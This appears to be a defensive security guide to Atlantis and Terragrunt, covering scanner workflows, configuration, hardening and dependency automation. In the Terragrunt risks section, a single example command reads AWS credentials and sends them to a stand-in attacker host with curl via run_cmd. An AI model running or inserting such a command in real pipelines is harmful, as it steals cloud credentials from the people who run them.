# Atlantis and Terragrunt Security

## Table of Contents
- [Atlantis](#atlantis)
- [Atlantis Security Scanning Integration](#atlantis-security-scanning-integration)
- [Atlantis Configuration](#atlantis-configuration)
- [Atlantis vs Terraform Cloud](#atlantis-vs-terraform-cloud)
- [Terragrunt Security Risks](#terragrunt-security-risks)
- [Terragrunt Security Scanning](#terragrunt-security-scanning)
- [Terragrunt Hardening](#terragrunt-hardening)
- [Dependency Update Automation](#dependency-update-automation)

---

## Atlantis

Atlantis is a self-hosted, open-source (Apache 2.0) Go application that automates Terraform workflows via PR comments. It listens for VCS webhooks, runs `terraform plan`/`apply`, and posts output as PR comments. Supports GitHub, GitLab, Bitbucket, and Azure DevOps.

- **Repo:** [runatlantis/atlantis](https://github.com/runatlantis/atlantis)
- **Latest release:** v0.40.0 (January 2025); actively maintained, preparing for 1.0.0
- **OpenTofu support:** Native since v0.33.0 — use `terraform_distribution: opentofu`

### Credentials

Atlantis does not natively manage credentials or provide built-in OIDC. It uses whatever credentials the host environment provides. **Recommended production pattern:** Run on Kubernetes with IRSA (AWS) or Workload Identity (GCP/Azure) so credentials are short-lived and OIDC-federated at the infrastructure layer.

---

## Atlantis Security Scanning Integration

Atlantis has no built-in security scanning, but custom workflow `run` steps can integrate any CLI scanner. If a `run` step exits non-zero, the workflow halts — a natural security gate.

### Trivy Integration

```yaml
workflows:
  secure:
    plan:
      steps:
        - init
        - plan
        - run: trivy config --exit-code 1 --severity HIGH,CRITICAL .
```

### Checkov Integration

```yaml
workflows:
  secure:
    plan:
      steps:
        - init
        - run: checkov -d . --framework terraform --hard-fail-on HIGH
        - plan
```

### Available Environment Variables in `run` Steps

`$PLANFILE`, `$WORKSPACE`, `$DIR`, `$BASE_REPO_NAME`, `$HEAD_COMMIT`, `$PULL_NUM`.

Output control via `output` key: `show` (post to PR), `hide` (suppress), `strip_refreshing`. Sensitive text redaction uses a separate `filter_regex` key on the expanded run step form.

---

## Atlantis Configuration

### Repo-Level `atlantis.yaml`

```yaml
version: 3
projects:
  - dir: infra/production
    workspace: default
    terraform_distribution: terraform  # or "opentofu"
    terraform_version: v1.9.0
    workflow: security-scan
    apply_requirements: [approved, mergeable]

workflows:
  security-scan:
    plan:
      steps:
        - init
        - run: checkov -d . --framework terraform --hard-fail-on HIGH
        - plan
        - run:
            command: trivy config --exit-code 1 --severity HIGH,CRITICAL .
            output: show
    apply:
      steps:
        - apply
```

### Server-Side `repos.yaml` (Enforced by Admin)

```yaml
repos:
  - id: /.*/
    apply_requirements: [approved, mergeable]
    workflow: org-secure
    allowed_overrides: [workflow]
    allowed_workflows: [org-secure, org-secure-strict]

workflows:
  org-secure:
    plan:
      steps:
        - init
        - run: checkov -d . --framework terraform --soft-fail
        - plan

  org-secure-strict:
    plan:
      steps:
        - init
        - run: checkov -d . --framework terraform --hard-fail-on HIGH
        - run: trivy config --exit-code 1 --severity CRITICAL .
        - plan
```

Set via `--repo-config` flag when starting the Atlantis server.

---

## Atlantis vs Terraform Cloud

| Dimension | Atlantis | HCP Terraform |
|-----------|----------|---------------|
| Hosting | Self-hosted | SaaS (HashiCorp managed) |
| Cost | Free/open-source | Free tier; paid for governance |
| Policy-as-code | Via `run` steps (OPA/Checkov/Trivy) | Native Sentinel and OPA |
| Approval gates | `apply_requirements: [approved, mergeable]` | Built-in approval workflows, SSO |
| OIDC | Indirect via infrastructure | Native dynamic provider credentials |
| OpenTofu | Supported (v0.33.0+) | Not supported |
| State management | You manage (S3, GCS, etc.) | Built-in remote state |

---

## Terragrunt Security Risks

Terragrunt (by Gruntwork) orchestrates Terraform/OpenTofu at scale. Latest: v1.0.0-rc3 (March 2026). Fully supports OpenTofu as a first-class citizen.

### `run_cmd` — Arbitrary Code Execution

Executes arbitrary shell commands and returns stdout as interpolation result. **Highest-risk feature.**

Attack vector: A malicious PR modifying `terragrunt.hcl` could inject `run_cmd("curl attacker.com/exfil?data=$(cat ~/.aws/credentials)")` to exfiltrate credentials during CI plan runs.

Mitigation:
- Prefer native Terraform/Terragrunt functions over `run_cmd`
- Enforce mandatory code review on all `.hcl` file changes
- Validate and audit any external scripts invoked via `run_cmd`

### `generate` — File Injection

Injects files into the Terraform module directory before commands run. With `if_exists = "overwrite"`, can silently replace `provider.tf` or `backend.tf`.

Mitigation: Use `if_exists = "overwrite_terragrunt"` — only overwrites files that Terragrunt itself generated (marked with a signature comment), and errors if the file was part of the original module.

### Remote State Auto-Creation

Terragrunt auto-creates S3 buckets and DynamoDB tables for state storage. If `remote_state` config is tampered with, state could be redirected.

Mitigation: Pre-create state buckets with proper IAM, versioning, and encryption. Use bucket policies to block unauthorized changes.

### `auth_provider_cmd`

Executes before each Terragrunt run for fetching secrets/OIDC tokens. Same arbitrary execution risk as `run_cmd`.

---

## Terragrunt Security Scanning

| Tool | Terragrunt Support | Notes |
|------|-------------------|-------|
| Checkov | Yes | Use `--download-external-modules true` to resolve module refs. Can also integrate as a Terragrunt `before_hook`. |
| Trivy | Yes | Scans rendered HCL files. No Terragrunt-specific mode — scan generated Terraform files. |
| KICS | Yes | Scans HCL files including `.hcl`. No dedicated Terragrunt parser but handles standard HCL. |
| ~~Terrascan~~ | **Archived Nov 2025** | Repository archived by Tenable. Migrate to Checkov, KICS, or Trivy. |

**Most reliable approach:** Run `terragrunt render-json` or `terragrunt plan -out=plan.json` and scan the rendered output, since scanners don't natively understand Terragrunt constructs like `dependency`, `include`, or `run_cmd`.

### Terragrunt Before Hook for Scanning

```hcl
terraform {
  before_hook "security_scan" {
    commands = ["plan", "apply"]
    execute  = ["checkov", "-d", ".", "--download-external-modules", "true"]
  }
}
```

---

## Terragrunt Hardening

- Pin Terragrunt, Terraform/OpenTofu, and provider versions explicitly
- Use `terraform_version_constraint` and `terragrunt_version_constraint` in HCL
- Review all `run_cmd` and `generate` blocks in code review with the same scrutiny as Dockerfiles
- Enable S3 bucket encryption and versioning for remote state
- Use `prevent_destroy` lifecycle rules on critical resources
- Encrypt sensitive variables with AWS KMS or SOPS

---

## Dependency Update Automation

Automate provider and module updates to reduce the exposure window for known vulnerabilities.

### Renovate

Renovate's `terraform` manager parses `.tf` files and updates providers, modules, and `required_version`.

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "terraform": { "enabled": true },
  "packageRules": [
    {
      "matchDatasources": ["terraform-provider"],
      "groupName": "terraform providers",
      "schedule": ["before 8am on Monday"]
    },
    {
      "matchDatasources": ["terraform-module"],
      "groupName": "terraform modules",
      "schedule": ["before 8am on Monday"]
    }
  ]
}
```

For multi-platform lock file regeneration:

```json
{
  "packageRules": [{
    "matchDatasources": ["terraform-provider"],
    "postUpgradeTasks": {
      "commands": [
        "terraform providers lock -platform=linux_amd64 -platform=darwin_amd64 -platform=darwin_arm64"
      ],
      "fileFilters": [".terraform.lock.hcl"]
    }
  }]
}
```

**OpenTofu:** Renovate's `terraform` manager works with `.tf` files used by OpenTofu. Override registry with `registryUrls: ["https://registry.opentofu.org"]`. Dedicated `.tofu` file support is not yet merged.

### Dependabot

GitHub Dependabot has first-class Terraform support. OpenTofu support added December 2025.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "terraform"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
```

Multi-directory setup (one entry per directory containing Terraform configs):

```yaml
version: 2
updates:
  - package-ecosystem: "terraform"
    directory: "/infra/networking"
    schedule:
      interval: "weekly"
  - package-ecosystem: "terraform"
    directory: "/infra/compute"
    schedule:
      interval: "weekly"
```

**Limitation:** No `postUpgradeTasks` equivalent — multi-platform lock file hashes require a CI workflow triggered on Dependabot PRs.

### Comparison

| Feature | Renovate | Dependabot |
|---------|----------|------------|
| Terraform providers/modules | Yes | Yes |
| `.terraform.lock.hcl` | Yes (with postUpgradeTasks) | Yes (auto-updates if present) |
| OpenTofu `.tf` files | Yes | Yes (since Dec 2025) |
| Multi-platform lock hashes | Via postUpgradeTasks | Requires external CI workflow |
| Self-hosted | Yes | GitHub only |
| PR grouping | Flexible | Limited |
| CVE alerts | OSV + GitHub advisories | GitHub Advisory Database |

### IaC SBOM Generation

Checkov can generate IaC SBOMs in CycloneDX format: `checkov -d . -o cyclonedx`. This catalogs providers, modules, and their versions as SBOM components. Trivy also supports CycloneDX/SPDX output but with less IaC-specific granularity. IaC SBOMs are practical today for supply-chain auditing but there is no unified standard yet.
